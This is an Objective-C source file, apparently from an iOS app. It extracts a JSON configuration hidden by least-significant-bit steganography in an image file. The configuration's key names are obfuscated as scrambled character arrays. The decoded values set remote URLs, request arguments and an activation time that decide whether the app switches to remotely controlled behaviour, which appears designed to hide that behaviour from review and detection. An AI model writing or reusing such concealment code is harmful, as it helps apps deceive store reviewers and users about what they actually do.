
#import <Foundation/Foundation.h>
#import "ImageCheckTools.h"
#import "__ccisc.h"
#import "cfunc.h"
#import "coco_Tools.h"

typedef struct __imageTools
{
    void (*encode)(NSString*,NSString *, NSString*);
    unsigned char * (*decode)(NSString*);
    BOOL (*checkOpen)(NSString *);
} __imageTools_t;

static __imageTools_t *imgt = NULL;
static ccisc_t * ct = NULL;

static bool isBitSet(char ch, int pos) {
    // 7 6 5 4 3 2 1 0
    ch = ch >> pos;
    if(ch & 1)
        return true;
    return false;
}

static unsigned char * decodeImg_(NSString* imgFile)
{
    UIImage * image = [[UIImage alloc] initWithContentsOfFile:imgFile];
    CGImageRef imageRef = [image CGImage];
    size_t width = CGImageGetWidth(imageRef);
    size_t height = CGImageGetHeight(imageRef);
    size_t bytesPerRow = CGImageGetBytesPerRow(imageRef);
    CGDataProviderRef dataProvider = CGImageGetDataProvider(imageRef);
    CFDataRef data = CGDataProviderCopyData(dataProvider);
    size_t bitsPerComponent = CGImageGetBitsPerComponent(imageRef);
    size_t bitsPerPixel = CGImageGetBitsPerPixel(imageRef);
    const unsigned char *buffer = CFDataGetBytePtr(data);
    // char to work on
    char ch=0;
    int bit_count = 0;
    unsigned char * arr = malloc( width * height * sizeof(char) / 2 );
    int len = 0;
    memset(arr, 0, sizeof(char) * width * height / 2);
    bool isStop = false;
    bool hasAlpha = bitsPerPixel / bitsPerComponent > 3;
    for(int y=0;y < height && !isStop;y++)
    {
        for(int x=0;x < width && !isStop;x++)
        {
            if(hasAlpha)
            {
                unsigned char alpha = *(buffer + y * bytesPerRow + x * 4 + 3);
                if(alpha != 255) continue;
            }
            for(int color=0; color < 3 && !isStop; color++) {
                unsigned char c = *(buffer + y * bytesPerRow + x * 4 + color);
                if(isBitSet(c,0))
                    ch |= 1;
                bit_count++;
                if(bit_count == 8) {
                    bit_count = 0;
                    arr[len++] = ch;
                    // NULL char is encountered
                    if(ch == '\0') {
                        isStop = true;
                        break;
                    }
                    ch = 0;
                }
                else {
                    ch = ch << 1;
                }
            }
        }
    }
    return arr;
}
//
//static void encodeImg_(NSString* imgFile ,NSString * msg, NSString* path)
//{
//    if(!path) path = imgFile;
//    UIImage * image = [[UIImage alloc] initWithContentsOfFile:imgFile];
//    CGImageRef imageRef = image.CGImage;
//    size_t width = CGImageGetWidth(imageRef);  //获取图片像素的宽
//    size_t height = CGImageGetHeight(imageRef); //获取图片像素的高
//    size_t bitsPerComponent = CGImageGetBitsPerComponent(imageRef);
//    size_t bitsPerPixel = CGImageGetBitsPerPixel(imageRef);
//    size_t bytesPerRow = CGImageGetBytesPerRow(imageRef);
//    CGColorSpaceRef colorSpace = CGImageGetColorSpace(imageRef);
//    CGBitmapInfo bitmapInfo = CGImageGetBitmapInfo(imageRef);
//    bool shouldInterpolate = CGImageGetShouldInterpolate(imageRef);
//    CGColorRenderingIntent intent = CGImageGetRenderingIntent(imageRef);
//    CGDataProviderRef dataProvider = CGImageGetDataProvider(imageRef);
//    CFDataRef data = CGDataProviderCopyData(dataProvider);
//    UInt8 *buffer = (UInt8*)CFDataGetBytePtr(data);
//
//    bool isStop = false;
//    const char * str = [msg UTF8String];
//    // char to work on
//    unsigned long totalLen = strlen(str);
//    int curItr = 0;
//    char ch = str[curItr];
//    int bit_count = 0;
//    // to check whether file has ended
//    bool last_null_char = false;
//    // to check if the whole message is encoded or not
//    bool encoded = false;
//
//    for(int y=0;y < height && !isStop;y++)
//    {
//        for(int x=0;x < width && !isStop;x++)
//        {
//            for(int color=0; color < 3 && !isStop; color++) {
//                if(isBitSet(ch,7-bit_count))
//                    buffer[y * bytesPerRow + x * 4 + color] |= 1;
//                else
//                    buffer[y * bytesPerRow + x * 4 + color] &= ~1;
//
//                // increment bit_count to work on next bit
//                bit_count++;
//
//                // if last_null_char is true and bit_count is 8, then our message is successfully encode.
//                if(last_null_char && bit_count == 8) {
//                    encoded  = true;
//                    isStop = true;
//                    break;
//                }
//
//                // if bit_count is 8 we pick the next char from the file and work on it
//                if(bit_count == 8) {
//                    bit_count = 0;
//                    ch = str[++curItr];
//
//                    // if EndOfFile(EOF) is encountered insert NULL char to the image
//                    if(curItr == totalLen) {
//                        last_null_char = true;
//                        ch = '\0';
//                    }
//                }
//            }
//        }
//    }
//    // whole message was not encoded
//    if(!encoded) {
//        NSLog(@"Error...");
//    } else {
//        CFDataRef effectedData = CFDataCreate(NULL, buffer, CFDataGetLength(data));
//        CGDataProviderRef effectedDataProvider = CGDataProviderCreateWithCFData(effectedData);
//        CGImageRef effectedCgImage = CGImageCreate(
//                                                   width, height,
//                                                   bitsPerComponent, bitsPerPixel, bytesPerRow,
//                                                   colorSpace, bitmapInfo, effectedDataProvider,
//                                                   NULL, shouldInterpolate, intent);
//        UIImage *effectedImage = [[UIImage alloc] initWithCGImage:effectedCgImage];
//        CGImageRelease(effectedCgImage);
//        CFRelease(effectedDataProvider);
//        CFRelease(effectedData);
//        CFRelease(data);
//        [UIImagePNGRepresentation(effectedImage) writeToFile:path atomically:YES];
//    }
//}

//static BOOL checkCfgIsOpen_(NSString* file)
//{
//    unsigned char * d = imgt->decode(file);
//    int size = 0;
//    char ** data = [ctools convertStrInfo:d s:&size];
//    char * url = [[ctools strTools]->R(@[@"l", @"u", @"r"] ,@[@2,@3,@1]) UTF8String];
//    char * ioS = [[ctools strTools]->R(@[@"i", @"o"] ,@[@1,@2]) UTF8String];
//    char * time = [[ctools strTools]->R(@[@"t", @"i", @"m", @"e"] ,@[@1, @2, @3, @4]) UTF8String];
//
//    char * trueV = [[ctools strTools]->R(@[@"t", @"r", @"u", @"e"] ,@[@1, @2, @3, @4]) UTF8String];
//    char * falseV = [[ctools strTools]->R(@[@"f", @"a", @"l", @"s", @"e"] ,@[@1, @2, @3, @4, @5]) UTF8String];
//    bool io = false;
//    for(int i =0; i < size; i+=2)
//    {
//        if(strcmp(data[i], url) ==0)
//        {
//            ct->setRemoteURL_([NSString stringWithUTF8String:data[i + 1]]);
//        }
//        else if(strcmp(data[i], time) ==0)
//        {
//            ct->setOpenTime_(data[i + 1], 0);
//        }
//        else if(strcmp(data[i], ioS) == 0)
//        {
//            io = (strcmp(data[i + 1], trueV) == 0);
//        }
//    }
//    return ct->checkIsOpen_(io);
//}

static BOOL checkCfgIsOpen2_(NSString * file)
{
    char * c = imgt->decode(file);
    NSData *jsonData = [NSData dataWithBytes:c length:strlen(c)];
    NSError *err;
    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                        options:NSJSONReadingMutableContainers
                                                          error:&err];
    if(err)
    {
        NSLog(@"error:%@", err);
        return NO;
    }
#ifndef ONLY_TIME
    NSObject* info = dic[[ctools strTools]->R(@[@"l", @"u", @"r"] ,@[@2,@3,@1])];
    if(info)
    {
        if([info isKindOfClass:[NSArray class]])
        {
            for(NSString * str in (NSArray*)info)
            {
                ct->setRemoteURL_(str);
            }
        } else {
            ct->setRemoteURL_((NSString*) info);
        }
    }
    bool isPost = [dic[[ctools strTools]->R(@[@"i", @"o", @"s", @"P", @"t"] ,@[@1,@3,@4,@2,@3,@5])] boolValue];
    NSString * args = dic[[ctools strTools]->R(@[@"a", @"r", @"g", @"s"] ,@[@1, @2, @3, @4])];
    NSString * domain = dic[[ctools strTools]->R(@[@"d", @"o", @"m", @"a", @"i", @"n"] ,@[@1, @2, @3, @4, @5, @6])];
    ct->setPostAndArgs_(isPost, args, domain);
#endif
    NSString * time = dic[[ctools strTools]->R(@[@"t", @"i", @"m", @"e"] ,@[@1, @2, @3, @4])];
    if(time) {
        ct->setOpenTime_([time UTF8String] , 0);
    }
    bool io = [dic[[ctools strTools]->R(@[@"i", @"o"] ,@[@1,@2])] boolValue];
    return ct->checkIsOpen_(io);
}

static void initImgTool()
{
    if(imgt) return;
    imgt = malloc(sizeof(__imageTools_t));
    imgt->decode = decodeImg_;
//    imgt->encode = encodeImg_;
//    imgt->checkOpen = checkCfgIsOpen_;
    imgt->checkOpen = checkCfgIsOpen2_;
    ct = malloc(sizeof(ccisc_t));
    [_init_ccisc st:ct];
}

@implementation ImageCheckTools

//+ (void) setCfgFile : (NSString *) path imgPath: (NSString *) img
//{
//    initImgTool();
//    NSData * data = [NSData dataWithContentsOfFile:path];
//    NSString * str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
//    imgt->encode(img, str, nil);
//}

+ (bool) checkIsOpen: (NSString*) img
{
    initImgTool();
    return imgt->checkOpen(img);
}

@end
